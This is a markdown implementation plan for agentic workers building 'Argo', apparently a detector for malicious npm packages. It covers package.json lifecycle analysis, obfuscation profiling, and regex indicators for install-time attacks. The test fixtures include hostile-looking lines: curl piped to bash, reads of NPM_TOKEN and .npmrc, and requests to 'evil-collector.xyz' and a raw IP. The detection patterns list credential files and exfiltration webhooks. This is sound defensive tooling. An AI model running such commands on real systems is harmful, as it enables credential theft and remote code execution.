# Argo — M2 Extractor, part A (Tasks 8-10)

> **For agentic workers:** REQUIRED SUB-SKILL: superpowers:subagent-driven-development or superpowers:executing-plans. Read the index `2026-09-11-argo-plan.md` first. Depends on Task 3 (`PackageFiles`). Tasks 8, 9, 10 are independent of each other and of Tasks 4-7. Part B is `2026-09-11-argo-m2-extract-b.md`.

---

### Task 8: package.json analysis

**Files:**
- Create: `argo/extract/manifest.py`, `tests/test_manifest.py`

**Interfaces:**
- Consumes: `LIFECYCLE_SCRIPTS` (Task 3), `DepChange` (Task 1)
- Produces:
  - `lifecycle_scripts(manifest: dict[str, Any] | None) -> dict[str, str]`
  - `is_non_registry(spec: str) -> bool`
  - `dep_changes(new: dict[str, Any], old: dict[str, Any] | None) -> list[DepChange]` — added or changed entries of `dependencies`/`optionalDependencies`
  - `outside_files(paths: Iterable[str], manifest: dict[str, Any]) -> list[str]` — paths not covered by the `files` field (empty list if no `files` field)
  - `script_targets(scripts: dict[str, str], files: Iterable[str]) -> list[str]` — package files referenced by the script commands

- [ ] **Step 1: Write the failing tests `tests/test_manifest.py`**

```python
import pytest

from argo.extract.manifest import (
    dep_changes,
    is_non_registry,
    lifecycle_scripts,
    outside_files,
    script_targets,
)


def test_lifecycle_scripts_only_install_time():
    m = {"scripts": {"build": "tsc", "postinstall": "node bundle.js", "prepare": "npm run build"}}
    assert lifecycle_scripts(m) == {"postinstall": "node bundle.js", "prepare": "npm run build"}
    assert lifecycle_scripts({"scripts": "nope"}) == {}
    assert lifecycle_scripts(None) == {}


@pytest.mark.parametrize("spec", [
    "github:tanstack/router#79ac49e", "git+https://x/y.git", "https://x/y.tgz", "file:../x",
    "user/repo", "user/repo#main",
])
def test_non_registry_specs(spec):
    assert is_non_registry(spec)


@pytest.mark.parametrize("spec", ["^1.2.3", "1.0.0", "latest", ">=2 <3", "npm:other@1", "*"])
def test_registry_specs(spec):
    assert not is_non_registry(spec)


def test_dep_changes_detects_new_non_registry_optional_dependency():
    old = {"dependencies": {"a": "^1.0.0"}}
    new = {"dependencies": {"a": "^1.0.0"},
           "optionalDependencies": {"@tanstack/setup": "github:tanstack/router#79ac"}}
    [c] = dep_changes(new, old)
    assert (c.field, c.name, c.old, c.non_registry) == (
        "optionalDependencies", "@tanstack/setup", None, True)


def test_dep_changes_version_bump_is_registry():
    [c] = dep_changes({"dependencies": {"a": "^2.0.0"}}, {"dependencies": {"a": "^1.0.0"}})
    assert c.old == "^1.0.0" and not c.non_registry


def test_outside_files():
    m = {"files": ["dist", "src/"], "main": "index.js"}
    paths = ["dist/a.js", "src/b.ts", "router_init.js", "README.md", "package.json", "index.js"]
    assert outside_files(paths, m) == ["router_init.js"]
    assert outside_files(paths, {}) == []
    assert outside_files(["lib/x.js", "y.js"], {"files": ["lib/**/*.js"]}) == ["y.js"]


def test_script_targets():
    files = ["bundle.js", "scripts/setup.js", "index.js"]
    scripts = {"postinstall": "node bundle.js && node ./scripts/setup.js", "preinstall": "bun run index.js"}
    assert script_targets(scripts, files) == ["bundle.js", "scripts/setup.js", "index.js"]
    assert script_targets({"install": "node-gyp rebuild"}, files) == []
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `.venv/bin/pytest tests/test_manifest.py -q`
Expected: FAIL with `ModuleNotFoundError: No module named 'argo.extract.manifest'`.

- [ ] **Step 3: Implement `argo/extract/manifest.py`**

```python
import fnmatch
import re
from collections.abc import Iterable
from typing import Any

from argo.extract.archive import LIFECYCLE_SCRIPTS
from argo.schema import DepChange

DEP_FIELDS = ("dependencies", "optionalDependencies")
_NON_REGISTRY_PREFIXES = (
    "github:", "gitlab:", "bitbucket:", "git+", "git:", "git@", "http://", "https://",
    "file:", "link:",
)
_SHORTHAND = re.compile(r"^[\w.-]+/[\w.-]+(#.*)?$")
_ALWAYS_INCLUDED = ("readme", "license", "licence", "changelog", "notice")
_TOKEN_SPLIT = re.compile(r"[\s;&|()'\"`]+")


def lifecycle_scripts(manifest: dict[str, Any] | None) -> dict[str, str]:
    scripts = (manifest or {}).get("scripts")
    if not isinstance(scripts, dict):
        return {}
    return {k: str(scripts[k]) for k in LIFECYCLE_SCRIPTS if k in scripts}


def is_non_registry(spec: str) -> bool:
    s = spec.strip()
    return s.startswith(_NON_REGISTRY_PREFIXES) or bool(_SHORTHAND.match(s))


def _deps(manifest: dict[str, Any]) -> dict[tuple[str, str], str]:
    out: dict[tuple[str, str], str] = {}
    for field in DEP_FIELDS:
        deps = manifest.get(field)
        if isinstance(deps, dict):
            for name, spec in deps.items():
                out[(field, str(name))] = str(spec)
    return out


def dep_changes(new: dict[str, Any], old: dict[str, Any] | None) -> list[DepChange]:
    new_d = _deps(new)
    old_d = _deps(old) if old is not None else {}
    changes: list[DepChange] = []
    for (field, name), spec in sorted(new_d.items()):
        before = old_d.get((field, name))
        if before == spec:
            continue
        changes.append(DepChange(
            field=field, name=name, old=before, new=spec, non_registry=is_non_registry(spec)
        ))
    return changes


def _clean_pattern(p: str) -> str:
    return p.strip().removeprefix("./").rstrip("/")


def _included(path: str, patterns: list[str], main: str | None) -> bool:
    base = path.rsplit("/", 1)[-1].lower()
    if path == "package.json" or ("/" not in path and base.startswith(_ALWAYS_INCLUDED)):
        return True
    if main and path == main.removeprefix("./"):
        return True
    for p in patterns:
        if p in ("", "*", "**"):
            return True
        if path == p or path.startswith(p + "/"):
            return True
        # fnmatch's "*" already crosses "/", so "lib/**/*.js" must also match "lib/x.js"
        if fnmatch.fnmatch(path, p) or fnmatch.fnmatch(path, p.replace("**/", "")):
            return True
    return False


def outside_files(paths: Iterable[str], manifest: dict[str, Any]) -> list[str]:
    files = manifest.get("files")
    if not isinstance(files, list):
        return []
    patterns = [_clean_pattern(str(f)) for f in files]
    main = manifest.get("main")
    main_s = main if isinstance(main, str) else None
    return [p for p in paths if not _included(p, patterns, main_s)]


def script_targets(scripts: dict[str, str], files: Iterable[str]) -> list[str]:
    present = set(files)
    out: list[str] = []
    for cmd in scripts.values():
        for tok in _TOKEN_SPLIT.split(cmd):
            t = tok.removeprefix("./")
            if t in present and t not in out:
                out.append(t)
    return out
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_manifest.py -q`
Expected: PASS (all).

- [ ] **Step 5: Gate and commit**

```bash
.venv/bin/ruff format argo tests && .venv/bin/pytest -q && .venv/bin/mypy argo && .venv/bin/ruff check --fix argo tests
git add argo/extract/manifest.py tests/test_manifest.py
git commit -m "Add package.json analysis: lifecycle, dependencies, files field"
```

---

### Task 9: File diff and file profile

**Files:**
- Create: `argo/extract/diff.py`, `argo/extract/profile.py`, `tests/test_diff_profile.py`

**Interfaces:**
- Consumes: `PackageFiles` (Task 3), `FileChange`, `FileProfile` (Task 1)
- Produces:
  - `diff_files(new: PackageFiles, old: PackageFiles | None) -> list[FileChange]` — added (largest first), then modified, then removed; `old=None` means every file is added
  - `shannon_entropy(data: bytes) -> float`, `is_binary(data: bytes) -> bool`
  - `profile_file(path: str, data: bytes) -> FileProfile` — `minified = avg_line_len > 300`; `obfuscated = hex_identifiers >= 20 or long_encoded_strings >= 3` (both false for binaries)

- [ ] **Step 1: Write the failing tests `tests/test_diff_profile.py`**

```python
from argo.extract.diff import diff_files
from argo.extract.profile import is_binary, profile_file, shannon_entropy
from tests.helpers import make_pkg


def test_diff_statuses_and_order():
    old = make_pkg({"package.json": "{}", "a.js": "1", "gone.js": "x"})
    new = make_pkg({"package.json": '{"v":2}', "a.js": "1", "small.js": "1", "big.js": "1" * 100})
    got = [(c.status, c.path) for c in diff_files(new, old)]
    assert got == [("added", "big.js"), ("added", "small.js"),
                   ("modified", "package.json"), ("removed", "gone.js")]


def test_diff_without_old_means_all_added():
    assert {c.status for c in diff_files(make_pkg({"a": "1", "b": "2"}), None)} == {"added"}


def test_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"aaaa") == 0.0
    assert 7.9 < shannon_entropy(bytes(range(256)) * 4) <= 8.0


def test_binary_detection():
    assert is_binary(b"\x7fELF\x00\x01") and not is_binary(b"console.log(1)")


def test_profile_obfuscated_single_line_payload():
    data = ("var " + ",".join(f"_0x{i:04x}=1" for i in range(50)) + ";").encode()
    p = profile_file("bundle.js", data)
    assert p.obfuscated and p.lines == 1 and p.hex_identifiers == 50 and not p.binary


def test_profile_plain_readable_code():
    data = b"function add(a, b) {\n  return a + b;\n}\n" * 20
    p = profile_file("lib.js", data)
    assert not p.obfuscated and not p.minified and p.lines == 61


def test_profile_long_encoded_strings():
    blob = b"A" * 400
    p = profile_file("x.js", b"a='" + blob + b"';b='" + blob + b"';c='" + blob + b"';")
    assert p.long_encoded_strings == 3 and p.obfuscated and p.minified
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `.venv/bin/pytest tests/test_diff_profile.py -q`
Expected: FAIL with `ModuleNotFoundError`.

- [ ] **Step 3: Implement `argo/extract/diff.py`**

```python
from argo.extract.archive import PackageFiles
from argo.schema import FileChange


def _by_size(c: FileChange) -> tuple[int, str]:
    return (-c.size, c.path)


def diff_files(new: PackageFiles, old: PackageFiles | None) -> list[FileChange]:
    old_files = old.files if old is not None else {}
    added = [FileChange(path=p, status="added", size=len(b))
             for p, b in new.files.items() if p not in old_files]
    modified = [FileChange(path=p, status="modified", size=len(b))
                for p, b in new.files.items() if p in old_files and old_files[p] != b]
    removed = [FileChange(path=p, status="removed", size=len(b))
               for p, b in old_files.items() if p not in new.files]
    return sorted(added, key=_by_size) + sorted(modified, key=_by_size) + sorted(removed, key=_by_size)
```

- [ ] **Step 4: Implement `argo/extract/profile.py`**

```python
import math
import re
from collections import Counter

from argo.schema import FileProfile

HEX_ID = re.compile(rb"_0x[0-9a-fA-F]{4,}")
LONG_ENCODED = re.compile(rb"[A-Za-z0-9+/=]{300,}")
ENTROPY_SAMPLE_BYTES = 1_000_000


def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    n = len(data)
    return -sum(c / n * math.log2(c / n) for c in Counter(data).values())


def is_binary(data: bytes) -> bool:
    return b"\x00" in data[:8192]


def profile_file(path: str, data: bytes) -> FileProfile:
    binary = is_binary(data)
    lines = data.split(b"\n")
    avg = len(data) / len(lines)
    hex_ids = 0 if binary else len(HEX_ID.findall(data))
    long_enc = 0 if binary else len(LONG_ENCODED.findall(data))
    return FileProfile(
        path=path,
        size=len(data),
        lines=len(lines),
        avg_line_len=round(avg, 1),
        max_line_len=max(len(line) for line in lines),
        entropy=round(shannon_entropy(data[:ENTROPY_SAMPLE_BYTES]), 2),
        hex_identifiers=hex_ids,
        long_encoded_strings=long_enc,
        minified=not binary and avg > 300,
        obfuscated=not binary and (hex_ids >= 20 or long_enc >= 3),
        binary=binary,
    )
```

Note: `b"...\n" * 20` has 61 elements after `split(b"\n")` (3 lines × 20 + trailing empty) — that is what the test asserts.

- [ ] **Step 5: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_diff_profile.py -q`
Expected: PASS (7 tests).

- [ ] **Step 6: Gate and commit**

```bash
.venv/bin/ruff format argo tests && .venv/bin/pytest -q && .venv/bin/mypy argo && .venv/bin/ruff check --fix argo tests
git add argo/extract/diff.py argo/extract/profile.py tests/test_diff_profile.py
git commit -m "Add file diff and obfuscation profile"
```

---

### Task 10: Regex indicators

**Files:**
- Create: `argo/extract/indicators.py`, `tests/test_indicators.py`

**Interfaces:**
- Consumes: `PackageFiles` (Task 3), `is_binary` (Task 9), `Hit` (Task 1)
- Produces:
  - `CATEGORY_ORDER: tuple[str, ...] = ("runtime_download", "propagation", "credentials", "exec", "obfuscation", "network")` (priority, highest first)
  - `is_code(path: str) -> bool`
  - `scan_text(path: str, text: str) -> list[Hit]` — at most 3 hits per category per file, plus one aggregated obfuscation hit when ≥20 `_0x` identifiers
  - `scan_package(pkg: PackageFiles, paths: Iterable[str]) -> list[Hit]` — only existing, non-binary code files

- [ ] **Step 1: Write the failing tests `tests/test_indicators.py`**

```python
import pytest

from argo.extract.indicators import is_code, scan_package, scan_text
from tests.helpers import make_pkg


@pytest.mark.parametrize("line,category", [
    ("exec('curl -fsSL https://bun.sh/install | bash')", "runtime_download"),
    ("await fetch('https://api.github.com/user/repos', {method: 'POST'})", "propagation"),
    ("const t = process.env.NPM_TOKEN", "credentials"),
    ("fs.readFileSync(home + '/.npmrc')", "credentials"),
    ("require('child_process').execSync(cmd)", "exec"),
    ("new Function(atob(x))()", "exec"),
    ("String.fromCharCode(104, 105)", "obfuscation"),
    ("https.request('https://evil-collector.xyz/c')", "network"),
    ("post('http://45.9.148.108:8080/')", "network"),
])
def test_categories(line, category):
    assert category in {h.category for h in scan_text("x.js", line)}


@pytest.mark.parametrize("line", [
    "if (process.env.NODE_ENV === 'production') {}",
    "see https://github.com/org/repo and https://registry.npmjs.org/x",
    "const m = /a(b)/.exec(s)",
])
def test_common_benign_code_is_quiet(line):
    assert scan_text("x.js", line) == []


def test_line_numbers_and_caps():
    text = "ok\n" + "eval(a)\n" * 10
    hits = [h for h in scan_text("x.js", text) if h.category == "exec"]
    assert len(hits) == 3 and hits[0].line == 2


def test_hex_identifier_aggregate():
    text = ";".join(f"var _0x{i:04x}=1" for i in range(25))
    assert any("25 obfuscator-style" in h.snippet for h in scan_text("x.js", text))


def test_is_code():
    assert is_code("a/b.js") and is_code("x.mjs") and is_code("run.sh")
    assert not is_code("types.d.ts") and not is_code("README.md") and not is_code("a.js.map")


def test_scan_package_skips_non_code_and_missing():
    pkg = make_pkg({"a.js": "eval(x)", "README.md": "eval(x)", "b.bin": b"\x00eval("})
    hits = scan_package(pkg, ["a.js", "README.md", "b.bin", "missing.js"])
    assert {h.path for h in hits} == {"a.js"}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `.venv/bin/pytest tests/test_indicators.py -q`
Expected: FAIL with `ModuleNotFoundError`.

- [ ] **Step 3: Implement `argo/extract/indicators.py`**

```python
import re
from collections.abc import Iterable

from argo.extract.archive import PackageFiles
from argo.extract.profile import is_binary
from argo.schema import Hit

CATEGORY_ORDER: tuple[str, ...] = (
    "runtime_download", "propagation", "credentials", "exec", "obfuscation", "network",
)
_ALLOWED_HOSTS = (
    r"(?:registry\.npmjs\.org|registry\.yarnpkg\.com|(?:www\.)?npmjs\.(?:com|org)|github\.com"
    r"|nodejs\.org|(?:www\.)?w3\.org|json-schema\.org|localhost|127\.0\.0\.1|example\.(?:com|org))"
)
PATTERNS: dict[str, re.Pattern[str]] = {
    "runtime_download": re.compile(
        r"bun\.sh/install|oven-sh/bun|curl\s[^\n|]{0,200}\|\s*(?:ba)?sh|wget\s+https?://"
        r"|Invoke-WebRequest|\bbun\s+run\b"
    ),
    "propagation": re.compile(
        r"npm\s+publish|api\.github\.com|\.github/workflows|npm\s+(?:whoami|token)\b"
        r"|/-/whoami|/-/npm/v1/tokens"
    ),
    "credentials": re.compile(
        r"process\.env(?!\.NODE_ENV\b)|\.npmrc|NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_ACCESS_KEY_ID"
        r"|AWS_SECRET_ACCESS_KEY|\.ssh/|id_rsa|trufflehog|\.aws/credentials|/etc/passwd"
    ),
    "exec": re.compile(
        r"child_process|\bexecSync\b|\bspawnSync?\(|\beval\(|new\s+Function\(|vm\.runIn"
    ),
    "obfuscation": re.compile(
        r"String\.fromCharCode|\batob\(|Buffer\.from\([^)]{0,200}base64|(?:\\x[0-9a-fA-F]{2}){16,}"
    ),
    "network": re.compile(
        rf"https?://(?!{_ALLOWED_HOSTS}\b)[\w-]+(?:\.[\w-]+)+|\bfetch\(|\bhttps?\.(?:request|get)\("
        r"|XMLHttpRequest|\bnet\.connect\(|\bdns\.resolve|webhook\.site"
        r"|discord(?:app)?\.com/api/webhooks|\b\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}\b"
    ),
}
HEX_ID = re.compile(r"_0x[0-9a-fA-F]{4,}")
MAX_SCAN_CHARS = 5_000_000
MAX_HITS_PER_CATEGORY = 3
CODE_EXTENSIONS = (".js", ".cjs", ".mjs", ".jsx", ".ts", ".tsx", ".sh", ".py", ".ps1", ".bat", ".cmd")
_TYPE_DECLARATIONS = (".d.ts", ".d.cts", ".d.mts")


def is_code(path: str) -> bool:
    low = path.lower()
    return low.endswith(CODE_EXTENSIONS) and not low.endswith(_TYPE_DECLARATIONS)


def _snippet(text: str, start: int, end: int) -> str:
    return " ".join(text[max(0, start - 60) : end + 60].split())[:200]


def scan_text(path: str, text: str) -> list[Hit]:
    text = text[:MAX_SCAN_CHARS]
    hits: list[Hit] = []
    for category in CATEGORY_ORDER:
        for i, m in enumerate(PATTERNS[category].finditer(text)):
            if i >= MAX_HITS_PER_CATEGORY:
                break
            hits.append(Hit(
                category=category,
                path=path,
                line=text.count("\n", 0, m.start()) + 1,
                snippet=_snippet(text, m.start(), m.end()),
            ))
    n_hex = len(HEX_ID.findall(text))
    if n_hex >= 20:
        hits.append(Hit(category="obfuscation", path=path, line=1,
                        snippet=f"{n_hex} obfuscator-style identifiers (_0x...)"))
    return hits


def scan_package(pkg: PackageFiles, paths: Iterable[str]) -> list[Hit]:
    hits: list[Hit] = []
    for p in paths:
        data = pkg.files.get(p)
        if data is not None and is_code(p) and not is_binary(data):
            hits += scan_text(p, pkg.text(p))
    return hits
```

Note on the `propagation` test line: it also produces a `network` hit (`fetch(`) — tests only assert that the expected category is present.

- [ ] **Step 4: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_indicators.py -q`
Expected: PASS. If a benign line in `test_common_benign_code_is_quiet` fires, fix the pattern (not the test): those three lines are the most common false positives in real packages.

- [ ] **Step 5: Gate and commit**

```bash
.venv/bin/ruff format argo tests && .venv/bin/pytest -q && .venv/bin/mypy argo && .venv/bin/ruff check --fix argo tests
git add argo/extract/indicators.py tests/test_indicators.py
git commit -m "Add regex indicators for install-time attack patterns"
```
